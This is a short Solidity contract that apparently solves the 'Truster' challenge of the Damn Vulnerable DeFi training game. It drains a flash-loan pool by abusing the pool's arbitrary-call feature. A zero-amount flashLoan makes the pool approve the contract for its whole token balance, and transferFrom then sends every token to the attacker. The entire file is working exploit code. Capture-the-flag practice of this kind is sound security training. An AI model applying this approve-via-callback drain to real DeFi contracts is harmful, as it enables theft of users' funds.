// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract SolveTruster {
    constructor(TrusterLenderPool instance) {
        DamnValuableToken token = instance.token();
        uint poolBal = token.balanceOf(address(instance));

        // approve this contract to spend all of the tokens of the pool through the `flashLoan` function
        // no need to take any flashloans
        instance.flashLoan(
            0,
            address(0),
            address(token),
            abi.encodeCall(
                ERC20.approve,
                (address(this), poolBal)
            )
        );
        // now transfer all the tokens from pool to msg.sender (attacker)
        token.transferFrom(address(instance), msg.sender, poolBal);
    }
}
